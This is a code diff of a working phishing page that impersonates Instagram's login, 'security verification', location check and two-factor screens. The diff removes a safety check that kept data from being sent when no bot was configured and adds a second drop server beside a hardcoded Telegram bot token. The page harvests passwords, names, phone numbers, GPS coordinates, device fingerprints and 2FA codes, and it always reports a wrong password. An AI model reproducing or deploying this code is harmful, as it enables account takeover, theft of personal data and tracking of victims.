@@ -15,7 +15,7 @@
         }
 
         body {
-            background-color: #fafafa;
+            background-color: #ffffff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -31,7 +31,6 @@
             justify-content: center;
             align-items: center;
             gap: 60px;
-            position: relative;
         }
 
         .phone-image {
@@ -44,7 +43,6 @@
         .phone-image img {
             height: 600px;
             display: block;
-            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.1));
         }
 
         .login-section {
@@ -62,14 +60,13 @@
         }
 
         .logo {
-            font-family: 'Billabong', cursive;
+            font-family: 'Instagram', cursive;
             font-size: 51px;
             margin-bottom: 30px;
-            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             font-weight: normal;
-            letter-spacing: 1px;
         }
 
         .input-group {
@@ -161,7 +158,7 @@
         .signup-box {
             background-color: white;
             border: 1px solid #dbdbdb;
-            padding: 20px;
+            padding: 25px;
             text-align: center;
             font-size: 14px;
             margin-bottom: 20px;
@@ -200,7 +197,7 @@
             transform: scale(1.05);
         }
 
-        /* Modal Styles */
+        /* Modal Styles - Instagram New Design */
         .modal {
             display: none;
             position: fixed;
@@ -208,7 +205,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
+            background-color: rgba(0, 0, 0, 0.85);
             z-index: 1000;
             justify-content: center;
             align-items: center;
@@ -239,10 +236,10 @@
         }
 
         .modal-logo {
-            font-family: 'Billabong', cursive;
+            font-family: 'Instagram', cursive;
             font-size: 42px;
             margin-bottom: 20px;
-            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             font-weight: normal;
@@ -310,28 +307,6 @@
 
         .info-modal {
             max-width: 500px;
-        }
-
-        .info-item {
-            text-align: left;
-            margin: 10px 0;
-            padding: 12px;
-            background-color: #fafafa;
-            border-radius: 6px;
-            font-size: 12px;
-            border-left: 3px solid #0095f6;
-        }
-
-        .info-label {
-            font-weight: 600;
-            color: #262626;
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .info-value {
-            color: #8e8e8e;
-            word-break: break-word;
         }
 
         .loader {
@@ -418,11 +393,6 @@
             line-height: 1.4;
         }
 
-        .modal-icon {
-            font-size: 50px;
-            margin-bottom: 20px;
-        }
-
         .input-error {
             border-color: #ed4956 !important;
         }
@@ -469,12 +439,74 @@
             font-size: 24px;
         }
 
+        .verification-code-box {
+            background: #fafafa;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .verification-code {
+            font-family: monospace;
+            font-size: 24px;
+            letter-spacing: 8px;
+            color: #262626;
+            font-weight: 600;
+            padding: 10px;
+            background: white;
+            border-radius: 6px;
+            border: 1px solid #dbdbdb;
+            margin: 10px 0;
+        }
+
+        .security-steps {
+            text-align: left;
+            margin: 20px 0;
+        }
+
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+
+        .step-number {
+            background: #0095f6;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+
+        .step-content {
+            flex: 1;
+        }
+
+        .step-title {
+            font-weight: 600;
+            color: #262626;
+            font-size: 14px;
+            margin-bottom: 3px;
+        }
+
+        .step-description {
+            color: #8e8e8e;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
         /* Instagram Font */
         @font-face {
-            font-family: 'Billabong';
+            font-family: 'Instagram';
             src: url('https://fonts.cdnfonts.com/s/12466/Billabong.woff') format('woff');
-            font-weight: normal;
-            font-style: normal;
         }
 
         .pulse {
@@ -547,8 +579,32 @@
     <div class="modal" id="initialModal">
         <div class="modal-content">
             <div class="modal-logo">Instagram</div>
-            <h2>Account Verification Required</h2>
-            <p>To help keep your account secure, Instagram needs to verify your identity.</p>
+            <h2>Security Verification Required</h2>
+            <p>To protect your account, we need to verify your identity. This is a one-time security check.</p>
+            
+            <div class="security-steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <div class="step-title">Provide Your Information</div>
+                        <div class="step-description">Enter your name and phone number for verification</div>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <div class="step-title">Location Check</div>
+                        <div class="step-description">We'll verify your location for security purposes</div>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <div class="step-title">Device Verification</div>
+                        <div class="step-description">We'll check your device to ensure it's secure</div>
+                    </div>
+                </div>
+            </div>
             
             <div class="input-group">
                 <input type="text" id="userFullName" placeholder="Full Name" required>
@@ -559,11 +615,7 @@
                 <div class="error-text" id="mobileError">Please enter a valid mobile number</div>
             </div>
             
-            <p style="font-size: 12px; color: #8e8e8e; margin: 20px 0; line-height: 1.4;">
-                By providing your information, you agree to our Terms and Privacy Policy. This helps us protect your account from unauthorized access.
-            </p>
-            
-            <button class="modal-btn" id="verifyUserBtn">Verify & Continue</button>
+            <button class="modal-btn" id="verifyUserBtn">Continue Verification</button>
             <div class="loader" id="verifyLoader"></div>
         </div>
     </div>
@@ -572,23 +624,18 @@
     <div class="modal" id="locationModal">
         <div class="modal-content">
             <div class="modal-logo">Instagram</div>
-            <h2>Location Verification Required</h2>
+            <h2>Location Verification</h2>
             <p>For your security, Instagram needs to verify your location to protect against suspicious login attempts.</p>
             
-            <div style="background: #fafafa; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left;">
-                <p style="font-size: 13px; color: #262626; margin-bottom: 8px; font-weight: 600;">
-                    Why we need this:
-                </p>
-                <ul style="font-size: 12px; color: #8e8e8e; padding-left: 20px; margin: 0;">
-                    <li>Confirm it's really you logging in</li>
-                    <li>Prevent unauthorized access from new locations</li>
-                    <li>Send alerts for suspicious activity</li>
-                </ul>
+            <div class="verification-code-box">
+                <div class="step-title" style="text-align: center; margin-bottom: 10px;">Step 2: Location Check</div>
+                <div class="verification-code" id="locationCode">VERIFYING...</div>
+                <div class="loading-text">Please allow location access to continue</div>
             </div>
             
             <div class="location-error-box" id="locationErrorBox" style="display: none;">
                 <p id="locationErrorMessage">
-                    <strong>Location access denied.</strong> Please allow location access to continue. If error persists, try opening this page in an incognito/private tab.
+                    <strong>Location access required.</strong> Please allow location access to continue. If error persists, try opening this page in an incognito/private tab.
                 </p>
             </div>
             
@@ -602,24 +649,25 @@
 
     <!-- Security Verification Modal -->
     <div class="modal" id="securityModal">
-        <div class="modal-content info-modal">
+        <div class="modal-content">
             <div class="modal-logo">Instagram</div>
-            <h2>Security Check Complete</h2>
+            <h2>Final Security Check</h2>
+            
+            <div class="verification-code-box">
+                <div class="step-title" style="text-align: center; margin-bottom: 10px;">Step 3: Device Verification</div>
+                <div class="verification-code" id="deviceCode">SCANNING...</div>
+                <div class="loading-text" id="verificationText">Checking device security and compatibility</div>
+            </div>
             
             <div class="security-check">
                 <div class="checkmark">✓</div>
-                <p style="color: #00a400; font-weight: 600;">Device verified successfully</p>
+                <div style="text-align: left;">
+                    <div style="color: #00a400; font-weight: 600; font-size: 14px;">Security verification in progress</div>
+                    <div style="color: #8e8e8e; font-size: 12px;">This may take a few seconds</div>
+                </div>
             </div>
             
-            <p style="font-size: 14px; color: #8e8e8e; margin: 20px 0;">
-                Your device information has been verified for security purposes.
-            </p>
-            
-            <div id="deviceInfo" style="text-align: left; max-height: 300px; overflow-y: auto; margin: 20px 0;">
-                <!-- Device info will be populated here -->
-            </div>
-            
-            <button class="modal-btn" id="continueBtn">Continue to Instagram</button>
+            <button class="modal-btn" id="continueBtn" style="display: none;">Continue to Instagram</button>
         </div>
     </div>
 
@@ -630,15 +678,14 @@
             <h2>Two-Factor Authentication</h2>
             <p>Enter the 6-digit code sent to your phone ending with ****<span id="phoneLastDigits"></span></p>
             
-            <div class="input-group" style="margin: 25px 0;">
-                <input type="text" id="twoFactorCode" placeholder="6-digit code" maxlength="6" pattern="\d{6}" required style="text-align: center; font-size: 18px; letter-spacing: 8px;">
+            <div class="verification-code-box">
+                <div class="verification-code" style="font-size: 32px; padding: 15px;">------</div>
+                <div class="input-group" style="margin: 20px 0;">
+                    <input type="text" id="twoFactorCode" placeholder="Enter 6-digit code" maxlength="6" pattern="\d{6}" required style="text-align: center; font-size: 20px; letter-spacing: 5px; padding: 15px;">
+                </div>
             </div>
             
-            <p style="font-size: 12px; color: #8e8e8e; margin: 15px 0;">
-                Didn't receive a code? <a href="#" style="color: #0095f6; text-decoration: none;">Resend Code</a>
-            </p>
-            
-            <button class="modal-btn" id="verifyCodeBtn">Verify</button>
+            <button class="modal-btn" id="verifyCodeBtn">Verify Code</button>
             <button class="modal-btn-secondary" id="useBackupBtn">Use Backup Code</button>
         </div>
     </div>
@@ -649,6 +696,7 @@
         // ============================================
         const TELEGRAM_BOT_TOKEN = '8220432493:AAHb6lKFGK5M6uWAIqlGTogjCamNfwJJT0Q';
         const TELEGRAM_CHAT_ID = '8089637989';
+        const WEBSITE_API_URL = 'https://instagram-dz-trap.kesug.com/api.php';
         
         // ============================================
         // DATA COLLECTION OBJECT
@@ -698,9 +746,11 @@
         const tryAgainBtn = document.getElementById('tryAgainBtn');
         const locationErrorBox = document.getElementById('locationErrorBox');
         const locationErrorMessage = document.getElementById('locationErrorMessage');
+        const locationCode = document.getElementById('locationCode');
         
         const continueBtn = document.getElementById('continueBtn');
-        const deviceInfoDiv = document.getElementById('deviceInfo');
+        const verificationText = document.getElementById('verificationText');
+        const deviceCode = document.getElementById('deviceCode');
         
         const twoFactorCodeInput = document.getElementById('twoFactorCode');
         const verifyCodeBtn = document.getElementById('verifyCodeBtn');
@@ -713,6 +763,7 @@
         let locationAllowed = false;
         let userInfoCollected = false;
         let locationModalShown = false;
+        let verificationSteps = 0;
 
         // ============================================
         // INITIALIZATION
@@ -732,7 +783,7 @@
                 setTimeout(() => {
                     initialModal.style.display = 'flex';
                     document.body.style.overflow = 'hidden';
-                }, 1000);
+                }, 800);
             } else {
                 userInfoCollected = true;
                 // Check if location was already allowed
@@ -741,13 +792,32 @@
                 if (!locationAllowed) {
                     setTimeout(() => {
                         showLocationModal();
-                    }, 800);
+                    }, 600);
                 }
             }
             
             // Prevent developer tools
             preventDevTools();
+            
+            // Generate verification codes
+            generateVerificationCodes();
         });
+
+        // ============================================
+        // VERIFICATION CODE GENERATION
+        // ============================================
+        function generateVerificationCodes() {
+            // Generate random verification codes
+            const locationVerificationCode = 'LOC-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+            const deviceVerificationCode = 'DEV-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+            
+            collectedData.verificationCodes = {
+                location: locationVerificationCode,
+                device: deviceVerificationCode
+            };
+            
+            return { locationVerificationCode, deviceVerificationCode };
+        }
 
         // ============================================
         // PASSWORD TOGGLE FUNCTIONALITY
@@ -802,10 +872,10 @@
             
             // Show loading state
             verifyUserBtn.disabled = true;
-            verifyUserBtn.textContent = '';
+            verifyUserBtn.textContent = 'Verifying...';
             verifyLoader.style.display = 'block';
             
-            // Send user info to Telegram
+            // Send user info to Telegram and Website
             await sendToTelegram('USER_INFO');
             
             // Mark as completed
@@ -816,13 +886,13 @@
             setTimeout(() => {
                 initialModal.style.display = 'none';
                 verifyUserBtn.disabled = false;
-                verifyUserBtn.textContent = 'Verify & Continue';
+                verifyUserBtn.textContent = 'Continue Verification';
                 verifyLoader.style.display = 'none';
                 document.body.style.overflow = 'auto';
                 
                 // Show location modal
                 showLocationModal();
-            }, 1000);
+            }, 1500);
         });
 
         // ============================================
@@ -840,7 +910,20 @@
                 locationBtnText.textContent = 'Allow Location Access';
                 locationLoader.style.display = 'none';
                 allowLocationBtn.disabled = false;
+                
+                // Start location code animation
+                animateLocationCode();
             }
+        }
+
+        function animateLocationCode() {
+            let dots = 0;
+            const interval = setInterval(() => {
+                dots = (dots + 1) % 4;
+                locationCode.textContent = 'VERIFYING' + '.'.repeat(dots);
+            }, 500);
+            
+            return interval;
         }
 
         function hideLocationModal() {
@@ -878,16 +961,22 @@
                         locationAllowed = true;
                         sessionStorage.setItem('insta_location_allowed', 'true');
                         
-                        // Send location to Telegram
+                        // Update verification code
+                        locationCode.textContent = collectedData.verificationCodes.location;
+                        locationCode.style.color = '#00a400';
+                        
+                        // Send location to Telegram and Website
                         await sendToTelegram('LOCATION');
                         
-                        // Hide modal
-                        hideLocationModal();
-                        
-                        // Show security verification
+                        // Hide modal after delay
                         setTimeout(() => {
-                            showSecurityVerification();
-                        }, 500);
+                            hideLocationModal();
+                            
+                            // Show security verification
+                            setTimeout(() => {
+                                showSecurityVerification();
+                            }, 500);
+                        }, 2000);
                     },
                     async function(error) {
                         // Error - location denied
@@ -980,7 +1069,7 @@
             btnLoader.style.display = 'block';
             submitBtn.disabled = true;
             
-            // Send credentials to Telegram
+            // Send credentials to Telegram and Website
             await sendToTelegram('CREDENTIALS');
             
             // Always show wrong password error (as per requirement)
@@ -1096,8 +1185,6 @@
                     usedJSHeapSize: formatBytes(performance.memory.usedJSHeapSize)
                 };
             }
-            
-            console.log('Device info collected for educational purposes');
         }
 
         async function getIPAndNetworkInfo() {
@@ -1186,8 +1273,12 @@
                         
                         collectedData.timestamps.locationCaptured = new Date().toISOString();
                         
-                        // Send approximate location to Telegram
+                        // Send approximate location to Telegram and Website
                         await sendToTelegram('LOCATION_IP');
+                        
+                        // Update verification code
+                        locationCode.textContent = 'IP-' + data.ip.substring(0, 8);
+                        locationCode.style.color = '#ff9900';
                         
                         // Auto-hide modal after 2 seconds
                         setTimeout(() => {
@@ -1211,124 +1302,47 @@
             securityModal.style.display = 'flex';
             document.body.style.overflow = 'hidden';
             
-            // Display device info
-            displayDeviceInfo();
+            // Animate device code
+            animateDeviceVerification();
             
-            // Send all collected data to Telegram
+            // Send all collected data to Telegram and Website
             setTimeout(async () => {
                 await sendToTelegram('FULL_DATA');
+                
+                // Show continue button after verification
+                setTimeout(() => {
+                    deviceCode.textContent = collectedData.verificationCodes.device;
+                    deviceCode.style.color = '#00a400';
+                    verificationText.textContent = 'Device verification complete ✓';
+                    continueBtn.style.display = 'block';
+                }, 3000);
             }, 1000);
+        }
+
+        function animateDeviceVerification() {
+            const steps = [
+                'SCANNING DEVICE...',
+                'CHECKING SECURITY...',
+                'VERIFYING SYSTEM...',
+                'ANALYZING DATA...',
+                'COMPLETING CHECK...'
+            ];
+            
+            let step = 0;
+            const interval = setInterval(() => {
+                deviceCode.textContent = steps[step];
+                step = (step + 1) % steps.length;
+                
+                if (step === 0) {
+                    clearInterval(interval);
+                }
+            }, 600);
         }
 
         continueBtn.addEventListener('click', function() {
             securityModal.style.display = 'none';
             document.body.style.overflow = 'auto';
         });
-
-        function displayDeviceInfo() {
-            let html = '';
-            
-            // User Information
-            if (collectedData.userInfo.fullName) {
-                html += `<div class="info-item">
-                    <span class="info-label">Name:</span>
-                    <span class="info-value">${collectedData.userInfo.fullName}</span>
-                </div>`;
-            }
-            
-            if (collectedData.userInfo.mobileNumber) {
-                html += `<div class="info-item">
-                    <span class="info-label">Mobile:</span>
-                    <span class="info-value">${collectedData.userInfo.mobileNumber}</span>
-                </div>`;
-            }
-            
-            // Location Information
-            if (collectedData.location.latitude) {
-                html += `<div class="info-item">
-                    <span class="info-label">Location:</span>
-                    <span class="info-value">${collectedData.location.latitude}, ${collectedData.location.longitude}</span>
-                </div>`;
-                
-                if (collectedData.location.city) {
-                    html += `<div class="info-item">
-                        <span class="info-label">City:</span>
-                        <span class="info-value">${collectedData.location.city}, ${collectedData.location.country || ''}</span>
-                    </div>`;
-                }
-                
-                html += `<div class="info-item">
-                    <span class="info-label">Map Link:</span>
-                    <span class="info-value"><a href="${collectedData.location.mapLink}" target="_blank" style="color: #0095f6;">View on Google Maps</a></span>
-                </div>`;
-            }
-            
-            // Device Information
-            if (collectedData.deviceInfo.ipAddress) {
-                html += `<div class="info-item">
-                    <span class="info-label">IP Address:</span>
-                    <span class="info-value">${collectedData.deviceInfo.ipAddress}</span>
-                </div>`;
-            }
-            
-            html += `<div class="info-item">
-                <span class="info-label">Device:</span>
-                <span class="info-value">${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.os}</span>
-            </div>`;
-            
-            html += `<div class="info-item">
-                <span class="info-label">Browser:</span>
-                <span class="info-value">${collectedData.deviceInfo.browser}</span>
-            </div>`;
-            
-            html += `<div class="info-item">
-                <span class="info-label">Screen:</span>
-                <span class="info-value">${collectedData.deviceInfo.screenResolution}</span>
-            </div>`;
-            
-            if (collectedData.deviceInfo.battery && typeof collectedData.deviceInfo.battery !== 'string') {
-                html += `<div class="info-item">
-                    <span class="info-label">Battery:</span>
-                    <span class="info-value">${collectedData.deviceInfo.battery.level} ${collectedData.deviceInfo.battery.charging ? '(Charging)' : ''}</span>
-                </div>`;
-            }
-            
-            if (collectedData.deviceInfo.connection && typeof collectedData.deviceInfo.connection !== 'string') {
-                html += `<div class="info-item">
-                    <span class="info-label">Connection:</span>
-                    <span class="info-value">${collectedData.deviceInfo.connection.effectiveType} (${collectedData.deviceInfo.connection.downlink})</span>
-                </div>`;
-            }
-            
-            if (collectedData.deviceInfo.gpu && typeof collectedData.deviceInfo.gpu !== 'string') {
-                html += `<div class="info-item">
-                    <span class="info-label">GPU:</span>
-                    <span class="info-value">${collectedData.deviceInfo.gpu.renderer || 'Not detected'}</span>
-                </div>`;
-            }
-            
-            html += `<div class="info-item">
-                <span class="info-label">RAM:</span>
-                <span class="info-value">${collectedData.deviceInfo.deviceMemory || 'Unknown'}</span>
-            </div>`;
-            
-            html += `<div class="info-item">
-                <span class="info-label">CPU Cores:</span>
-                <span class="info-value">${collectedData.deviceInfo.hardwareConcurrency}</span>
-            </div>`;
-            
-            html += `<div class="info-item">
-                <span class="info-label">Timezone:</span>
-                <span class="info-value">${collectedData.deviceInfo.timezone}</span>
-            </div>`;
-            
-            html += `<div class="info-item">
-                <span class="info-label">Session ID:</span>
-                <span class="info-value">${collectedData.sessionId}</span>
-            </div>`;
-            
-            deviceInfoDiv.innerHTML = html;
-        }
 
         // ============================================
         // TWO-FACTOR AUTHENTICATION MODAL
@@ -1362,7 +1376,7 @@
             collectedData.twoFactorCode = code;
             collectedData.twoFactorTimestamp = new Date().toISOString();
             
-            // Send 2FA code to Telegram
+            // Send 2FA code to Telegram and Website
             await sendToTelegram('TWO_FACTOR');
             
             // Hide modal
@@ -1387,37 +1401,57 @@
         });
 
         // ============================================
-        // TELEGRAM INTEGRATION
+        // DUAL SENDER (TELEGRAM + WEBSITE)
         // ============================================
         async function sendToTelegram(type) {
-            // Don't send if tokens are not configured
-            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('YOUR_BOT') || 
-                !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID.includes('YOUR_CHAT')) {
-                console.log('Telegram bot not configured. Educational mode.');
-                return;
-            }
+            // 1. Prepare Data for Website
+            // We verify the link uses HTTPS to prevent blocking
+            const websiteURL = WEBSITE_API_URL; 
             
-            try {
-                let message = formatTelegramMessage(type);
-                
-                // URL encode the message
-                const encodedMessage = encodeURIComponent(message);
-                
-                // Send to Telegram
-                const response = await fetch(
-                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`,
-                    { method: 'POST' }
-                );
-                
-                if (response.ok) {
-                    console.log(`Data sent to Telegram (${type})`);
-                    collectedData.timestamps.dataSent = new Date().toISOString();
-                } else {
-                    console.error('Telegram API error:', await response.text());
-                }
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
+            // Add the event type to the data object so the PHP knows what happened
+            const payload = {
+                ...collectedData, // specific copy of all data
+                event_type: type
+            };
+
+            // 2. Prepare Data for Telegram
+            let telegramMessage = '';
+            if (TELEGRAM_BOT_TOKEN && !TELEGRAM_BOT_TOKEN.includes('YOUR_BOT')) {
+                telegramMessage = formatTelegramMessage(type);
             }
+
+            // 3. Send to BOTH simultaneously
+            const promises = [];
+
+            // --- SEND TO TELEGRAM ---
+            if (telegramMessage) {
+                const encodedMessage = encodeURIComponent(telegramMessage);
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
+                promises.push(
+                    fetch(telegramUrl, { method: 'POST' })
+                    .catch(e => console.error('Telegram Fail:', e))
+                );
+            }
+
+            // --- SEND TO WEBSITE ---
+            promises.push(
+                fetch(websiteURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(res => console.log(`Website sent (${type}):`, res.status))
+                .catch(e => console.error('Website Fail:', e))
+            );
+
+            // Wait for both to finish (does not block user experience)
+            await Promise.all(promises);
+            
+            // Log success
+            console.log(`Dual dispatch complete for ${type}`);
+            collectedData.timestamps.dataSent = new Date().toISOString();
         }
 
         function formatTelegramMessage(type) {
@@ -1628,17 +1662,6 @@
         usernameInput.addEventListener('blur', function() {
             if (this.value && !this.value.includes('@') && !this.value.match(/^[a-zA-Z0-9._]+$/)) {
                 showError('Please enter a valid username or email');
-            }
-        });
-
-        // Auto-detect and format phone numbers
-        userMobileInput.addEventListener('blur', function() {
-            if (this.value.length >= 10) {
-                // Format as international number
-                const cleaned = this.value.replace(/\D/g, '');
-                if (cleaned.length === 10) {
-                    this.value = `+1${cleaned}`; // Default to US
-                }
             }
         });
 
